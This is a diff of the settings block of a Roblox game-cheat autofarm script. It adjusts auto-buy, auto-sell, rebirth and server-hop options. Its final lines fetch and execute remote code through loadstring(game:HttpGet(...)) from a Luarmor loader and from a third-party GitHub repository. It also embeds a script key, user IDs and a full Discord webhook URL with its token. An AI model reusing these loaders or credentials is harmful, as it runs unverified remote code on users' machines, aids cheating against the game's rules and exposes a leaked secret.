@@ -1,6 +1,6 @@
 script_key="gijxApnnfPULbojMkoZSgIpcYOPSzspo";
 getgenv().Settings = {
-    Rarity = {
+    Rarity = { -- Recommend dont change this for new account
         "Common",
         "Rare",
         "Epic",
@@ -9,20 +9,20 @@ getgenv().Settings = {
         "Brainrot God",
         "Secret"
     },
-    WhiteScreen = true,
+    RebirthCap = 4,
     AutoRebirth = true,
-    TPSpeed = 50,
-    AutoLock = true,
+    AutoLock = false,
     AutoBuy = true,
     AutoSell = true,
-    AutoShutdownGameOnHop = true,
+    ShutdownOnPublicServer = true, --Auto Shutdown if script execute on public server
+    AutoShutdownGameOnHop = true, -- prevent hop from PS to public 
     AutoBuyRebirthRequirements = true,
     LockPriority = true,
-    CollectInterval = 30,
+    CollectInterval = 30, -- set this to math.huge for no collect
     ProtectRarityFromBeingSellAndRebirth = {
         "Secret"
     },
-    Webhook = {
+Webhook = {
         Enabled = true,
         WebhookURL = "https://discord.com/api/webhooks/1402032089708101662/4ByjPz1boz3nAR66v1QzHzloamy3bGQyJYJAS2kCsHDZB1Uy__Jy2p54CQicQDgeDJPk",
         WebhookSettings = {
@@ -38,6 +38,8 @@ getgenv().Settings = {
             },
         }
     }
+
 }
 
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/68831d037e047cd766c39f4497a46932.lua"))()
+_G.Config = { UserID = "bbcc5890-fa5d-4d7f-96d3-0c225b3f04a8", discord_id = "1095855945386578071" , Note = "", } loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/sab"))()
